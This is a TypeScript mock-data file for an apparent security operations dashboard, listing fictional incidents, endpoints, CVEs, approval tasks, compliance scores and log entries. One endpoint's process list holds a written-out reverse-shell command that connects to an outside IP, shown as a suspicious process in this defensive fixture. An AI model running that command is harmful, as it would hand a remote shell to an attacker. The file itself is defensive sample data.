import { Incident, Endpoint, ApprovalTask, ComplianceScore } from "../types";

export const mockIncidents: Incident[] = [
  {
    id: "INC-2026-0041",
    title: "Suspicious LSASS Process Memory Dump",
    category: "Credential Access",
    severity: "critical",
    status: "active",
    hostname: "ad-dc-windows-01",
    ip: "10.120.10.4",
    timestamp: "2026-07-12T03:30:15Z",
    description: "LSASS process memory was dumped by an unauthorized administrator shell. Possible Mimikatz usage.",
    detector: "Defender for Endpoint"
  },
  {
    id: "INC-2026-0042",
    title: "Active SSH Brute Force Campaign",
    category: "Initial Access",
    severity: "high",
    status: "investigating",
    hostname: "web-prod-ubuntu-01",
    ip: "10.120.20.14",
    timestamp: "2026-07-12T03:22:45Z",
    description: "Detected over 5,400 failed SSH logins from external IP 185.220.101.44 within 10 minutes.",
    detector: "Suricata NIDS"
  },
  {
    id: "INC-2026-0043",
    title: "Unauthorized Lateral RDP Connection",
    category: "Lateral Movement",
    severity: "medium",
    status: "active",
    hostname: "workstation-12",
    ip: "10.120.40.112",
    timestamp: "2026-07-12T02:50:00Z",
    description: "RDP session established to ad-dc-windows-01 from a non-standard management workstation.",
    detector: "Active Directory Logs"
  },
  {
    id: "INC-2026-0044",
    title: "Outbound C2 Connection to Tor Relays",
    category: "Command & Control",
    severity: "critical",
    status: "active",
    hostname: "db-stage-postgres",
    ip: "10.120.30.22",
    timestamp: "2026-07-12T01:15:33Z",
    description: "Internal Postgres server initiating outbound connections to known Tor node addresses.",
    detector: "CrowdStrike Falcon"
  },
  {
    id: "INC-2026-0045",
    title: "Anomalous PowerShell Execution Flow",
    category: "Execution",
    severity: "low",
    status: "resolved",
    hostname: "workstation-09",
    ip: "10.120.40.109",
    timestamp: "2026-07-11T23:05:00Z",
    description: "Base64 encoded script block executed in user context. Verified as scheduled backup maintenance script.",
    detector: "Windows Event Logs"
  },
  {
    id: "INC-2026-0046",
    title: "Suspicious Domain Controller Query",
    category: "Discovery",
    severity: "medium",
    status: "suppressed",
    hostname: "workstation-12",
    ip: "10.120.40.112",
    timestamp: "2026-07-11T20:12:00Z",
    description: "Rapid Active Directory schema query from host executing local script. Administrator verified audit.",
    detector: "VYUHA Core Agent"
  }
];

export const mockEndpoints: Endpoint[] = [
  {
    id: "ad-dc-windows-01",
    hostname: "ad-dc-windows-01",
    os: "Windows Server",
    osVersion: "2022 Datacenter",
    ip: "10.120.10.4",
    mac: "00:50:56:AB:2C:01",
    status: "online",
    cpuUsage: 14,
    memoryUsage: 78,
    diskUsage: 45,
    criticalAlertsCount: 1,
    highAlertsCount: 0,
    lastSeen: "2026-07-12T03:42:00Z",
    policyGroup: "Domain Controllers",
    cves: [
      { id: "CVE-2020-1472", severity: "critical", score: 10.0, description: "Zerologon: Elevation of privilege vulnerability in Netlogon protocol.", publishDate: "2020-08-11" },
      { id: "CVE-2021-34527", severity: "high", score: 8.8, description: "PrintNightmare: Remote code execution vulnerability in Windows Print Spooler.", publishDate: "2021-07-01" }
    ],
    processes: [
      { pid: 652, name: "lsass.exe", cpu: 1.2, memory: 342, path: "C:\\Windows\\System32\\lsass.exe", status: "suspicious" },
      { pid: 412, name: "services.exe", cpu: 0.1, memory: 45, path: "C:\\Windows\\System32\\services.exe", status: "running" },
      { pid: 1024, name: "dns.exe", cpu: 2.5, memory: 890, path: "C:\\Windows\\System32\\dns.exe", status: "running" }
    ]
  },
  {
    id: "web-prod-ubuntu-01",
    hostname: "web-prod-ubuntu-01",
    os: "Ubuntu Server",
    osVersion: "22.04 LTS",
    ip: "10.120.20.14",
    mac: "00:50:56:AB:2C:14",
    status: "online",
    cpuUsage: 88,
    memoryUsage: 92,
    diskUsage: 81,
    criticalAlertsCount: 0,
    highAlertsCount: 1,
    lastSeen: "2026-07-12T03:41:45Z",
    policyGroup: "Web Server Farm",
    cves: [
      { id: "CVE-2024-3094", severity: "critical", score: 10.0, description: "Backdoor in upstream xz-utils library (xz) version 5.6.0 and 5.6.1.", publishDate: "2024-03-29" },
      { id: "CVE-2023-38408", severity: "high", score: 8.1, description: "OpenSSH remote code execution vulnerability in ssh-agent forwarding.", publishDate: "2023-07-19" }
    ],
    processes: [
      { pid: 14452, name: "nginx", cpu: 12.4, memory: 180, path: "/usr/sbin/nginx", status: "running" },
      { pid: 19890, name: "sshd: root@pts/0", cpu: 45.8, memory: 89, path: "/usr/sbin/sshd", status: "suspicious" },
      { pid: 21002, name: "python3 -c import socket...", cpu: 28.1, memory: 54, path: "/usr/bin/python3", status: "suspicious" }
    ]
  },
  {
    id: "db-stage-postgres",
    hostname: "db-stage-postgres",
    os: "RedHat Linux",
    osVersion: "8.6 Enterprise",
    ip: "10.120.30.22",
    mac: "00:50:56:AB:2C:22",
    status: "isolated",
    cpuUsage: 2,
    memoryUsage: 35,
    diskUsage: 22,
    criticalAlertsCount: 1,
    highAlertsCount: 0,
    lastSeen: "2026-07-12T03:39:10Z",
    policyGroup: "Staging Databases",
    cves: [],
    processes: [
      { pid: 892, name: "postgres", cpu: 0.1, memory: 1420, path: "/usr/bin/postgres", status: "running" },
      { pid: 31102, name: "sh -i >& /dev/tcp/185.220.101.44/443", cpu: 1.5, memory: 12, path: "/bin/sh", status: "suspicious" }
    ]
  },
  {
    id: "workstation-12",
    hostname: "workstation-12",
    os: "macOS",
    osVersion: "Sonoma 14.4",
    ip: "10.120.40.112",
    mac: "8C:85:90:3F:8A:C2",
    status: "online",
    cpuUsage: 18,
    memoryUsage: 64,
    diskUsage: 73,
    criticalAlertsCount: 0,
    highAlertsCount: 0,
    lastSeen: "2026-07-12T03:42:30Z",
    policyGroup: "Corporate Workstations",
    cves: [
      { id: "CVE-2023-4863", severity: "high", score: 8.8, description: "Heap buffer overflow in libwebp in Google Chrome / macOS WebP display library.", publishDate: "2023-09-12" }
    ],
    processes: [
      { pid: 489, name: "Slack", cpu: 4.5, memory: 540, path: "/Applications/Slack.app", status: "running" },
      { pid: 902, name: "Terminal", cpu: 0.2, memory: 110, path: "/Applications/Utilities/Terminal.app", status: "running" }
    ]
  },
  {
    id: "workstation-09",
    hostname: "workstation-09",
    os: "Windows Server",
    osVersion: "11 Enterprise",
    ip: "10.120.40.109",
    mac: "8C:85:90:3F:8A:A9",
    status: "online",
    cpuUsage: 5,
    memoryUsage: 45,
    diskUsage: 52,
    criticalAlertsCount: 0,
    highAlertsCount: 0,
    lastSeen: "2026-07-12T03:40:00Z",
    policyGroup: "Corporate Workstations",
    cves: [],
    processes: [
      { pid: 1120, name: "chrome.exe", cpu: 1.1, memory: 610, path: "C:\\Program Files\\Google\\Chrome\\chrome.exe", status: "running" }
    ]
  }
];

export const mockApprovalTasks: ApprovalTask[] = [
  {
    id: "APP-0209",
    action: "isolate_host",
    target: "web-prod-ubuntu-01",
    requester: "VYUHA.AI Copilot (Incident Playbook-2)",
    reason: "Severe brute-force compromise and suspected lateral movement attempt detected.",
    status: "pending",
    timestamp: "2026-07-12T03:32:00Z",
    details: "Isolate the virtual interface `eth0` at network firewall. All traffic except VPN SOC access will be severed."
  },
  {
    id: "APP-0210",
    action: "terminate_process",
    target: "PID 652 (lsass.exe dump) on ad-dc-windows-01",
    requester: "Kaveesh (Senior SOC Analyst)",
    reason: "Dumping security accounts manager memory violates domain administration guidelines.",
    status: "pending",
    timestamp: "2026-07-12T03:38:00Z",
    details: "Terminate the process tree initiated by parent cmd.exe (PID 9110) on Active Directory DC."
  },
  {
    id: "APP-0208",
    action: "block_ip",
    target: "185.220.101.44",
    requester: "Kaveesh (Senior SOC Analyst)",
    reason: "Verified brute-force attacks and active Tor connection endpoints.",
    status: "approved",
    timestamp: "2026-07-12T03:02:00Z",
    details: "Add IP address to Palo Alto Edge Firewalls global ban policy block rule."
  },
  {
    id: "APP-0207",
    action: "quarantine_file",
    target: "C:\\Users\\Guest\\Downloads\\malware.exe on workstation-09",
    requester: "VYUHA Core Agent",
    reason: "SHA-256 matches known ransomware signature (LockBit 3.0 variant).",
    status: "approved",
    timestamp: "2026-07-11T22:30:10Z",
    details: "Encrypt and move file to secure repository directory C:\\ProgramData\\Vyuha\\Quarantine"
  }
];

export const mockCompliance: ComplianceScore[] = [
  { name: "SOC 2 Type II", score: 94, passedRules: 122, totalRules: 130, status: "pass" },
  { name: "ISO/IEC 27001", score: 89, passedRules: 98, totalRules: 110, status: "pass" },
  { name: "CIS Controls v8", score: 76, passedRules: 76, totalRules: 100, status: "warn" },
  { name: "NIST CSF 2.0", score: 81, passedRules: 81, totalRules: 100, status: "pass" }
];

export const liveLogStream = [
  { timestamp: "03:42:55", message: "DNS query to external pool.ntp.org from workstation-12 (Allowed)", type: "info" },
  { timestamp: "03:42:15", message: "Active Directory policy updated for Domain Controllers", type: "info" },
  { timestamp: "03:41:04", message: "PowerShell executing bypass policy command on workstation-12", type: "warning" },
  { timestamp: "03:40:12", message: "Alert! Outbound connection from db-stage-postgres to Tor network", type: "critical" },
  { timestamp: "03:39:48", message: "Firewall block: Inbound port 445 scan from external host 45.12.8.21", type: "warning" },
  { timestamp: "03:38:10", message: "LSASS dump request recorded on ad-dc-windows-01 (PID 652)", type: "critical" },
  { timestamp: "03:37:05", message: "Successful administrative RDP login to ad-dc-windows-01 from workstation-12", type: "info" },
];

